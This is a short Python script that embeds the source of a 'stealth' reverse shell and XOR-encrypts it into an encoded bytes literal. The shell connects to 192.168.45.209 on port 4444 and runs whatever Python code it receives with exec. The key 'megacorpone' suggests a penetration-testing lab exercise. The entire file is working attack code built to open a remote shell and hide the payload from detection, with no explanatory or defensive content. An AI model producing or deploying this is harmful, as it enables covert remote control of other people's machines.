payload_source = '''
import socket, io, contextlib

def stealth_reverse_shell():
    s = socket.socket()
    s.connect(("192.168.45.209", 4444))
    s.send(b"[*] Connected>>> ")
    while True:
        data = s.recv(4096)
        if not data:
            break
        cmd = data.decode().strip()
        if not cmd:
            s.send(b">>> ")
            continue
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            try:
                exec(cmd)
            except Exception as e:
                print(e)
        s.send(f"{out.getvalue()}>>> ".encode())
    s.close()

stealth_reverse_shell()
'''

key = b"megacorpone"
payload_bytes = payload_source.encode()
encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload_bytes)])

# Print as Python bytes literal
print("encrypted_payload = b'" + "".join(f"\\x{b:02x}" for b in encrypted) + "'")
